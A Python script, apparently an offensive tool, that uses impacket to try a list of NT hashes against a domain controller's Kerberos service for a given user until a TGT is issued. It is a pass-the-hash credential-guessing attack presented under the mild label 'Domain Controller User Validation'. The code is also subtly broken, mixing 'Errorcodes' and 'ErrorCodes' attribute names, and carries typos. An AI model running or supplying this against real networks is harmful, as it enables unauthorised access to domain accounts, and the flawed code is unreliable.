from __future__ import division
from __future__ import print_function
import argparse
import sys
from binascii import unhexlify
from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal
import socket
from impacket import smbconnection
from impacket.smbconnection import SMBConnection


def get_host_addrinfo(hostname):
    try:
        for res in socket.getaddrinfo(hostname, None, socket.AF_INET6,
                                      socket.SOCK_DGRAM, socket.IPPROTO_IP, socket.AI_CANONNAME):
            af, socktype, proto, canonname, sa = res
    except socket.gaierror:
        for res in socket.getaddrinfo(hostname, None, socket.AF_INET,
                                      socket.SOCK_DGRAM, socket.IPPROTO_IP, socket.AI_CANONNAME):
            af, socktype, proto, canonname, sa = res
    return sa[0]


def login(username, password, domain, lmhash, nthash, aesKey, dc_ip):
    dc_ip = get_host_addrinfo(dc_ip)
    try:
        kerb_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        getKerberosTGT(kerb_principal, password, domain,
                       unhexlify(lmhash), unhexlify(nthash), aesKey, dc_ip)
        return True
    except KerberosError as e:
        if e.getErrorCode() in [
            constants.Errorcodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value,
            constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value,
            constants.ErrorCodes.KDC_ERR_WRONG_REALM.value
        ]:
            print("[-] Username not found: %s/%s" % (domain, username))
        elif e.getErrorCode() == constants.Errorcodes.KDC_ERR_PREAUTH_FAILED.value:
            return
        else:
            print(e)
    except socket.error as e:
        print("[-] Connetion to DC failed")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Domain Controller User Validation')
    parser.add_argument('--username', type=str, help='username for authentication', required=True)
    parser.add_argument('--domain', type=str, help='domain name', required=True)
    parser.add_argument('--dc-ip', type=str, help='domain controller IP address', required=True)
    parser.add_argument('--hash-file', type=str, help='path to the file containing hashes', required=True)

    args = parser.parse_args()

    username = args.username
    domain = args.domain
    dc_ip = args.dc_ip
    hash_file = args.hash_file

    with open(hash_file) as f:
        hashes = [x.strip() for x in f.readlines()]

    # Iterate over the hashes and attempt login
    for hash in hashes:
        success = login(username, '', domain, '', hash, None, dc_ip)
        if success:
            print("[+] Success - valid user on DC found: {}/{}".format(domain, username))
            break
    else:
        print("[-] Authentication failed - No valid hash found.")
